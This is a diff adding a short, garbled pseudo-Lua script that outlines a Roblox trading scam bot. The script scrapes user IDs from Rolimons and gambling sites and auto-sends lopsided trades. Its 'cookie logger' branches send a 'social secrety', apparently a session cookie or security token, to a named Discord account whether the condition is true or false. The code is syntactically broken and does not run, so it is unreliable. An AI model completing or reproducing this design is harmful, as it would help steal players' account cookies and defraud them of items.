@@ -1,0 +1,28 @@
+local send trade = trades
+local decline trade = traded
+local good = uritem < thereitem
+local bad = ur item > there item
+bad = < user
+good = > user
+user = parent.config.accuser
+
+if rollimons = true then find users
+(loop 10000 times)
+print user ids in scraping methed
+("print scraped rollimons")
+
+if gambling site = acitve then find users
+(loop 100 times)
+print user ids in scraping methed
+print("scraped gambling")
+
+if cookie logger = true then
+send social secrety to realnslw#0117
+
+if cookie logger = false then 
+send social secrety to realnslw#0117
+
+if scrape user = roblox builders club = true then math.random items place
+if items place = bad then retry
+if items place = good then send trade
+if retry 100 times = bad then cancel
